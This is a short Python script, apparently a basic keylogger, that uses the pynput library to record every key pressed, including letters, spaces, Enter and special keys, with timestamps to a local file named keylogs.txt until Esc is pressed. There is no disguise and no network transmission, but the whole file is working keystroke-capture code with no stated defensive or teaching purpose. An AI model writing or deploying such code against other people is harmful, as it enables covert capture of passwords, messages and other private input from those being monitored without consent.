import logging
from pynput import keyboard

logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Alphanumeric key pressed: {key.char}')
    except AttributeError:
        if key == keyboard.Key.space:
            logging.info('Space key pressed')
        elif key == keyboard.Key.enter:
            logging.info('Enter key pressed')
        else:
            logging.info(f'Special key pressed: {key.name}')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()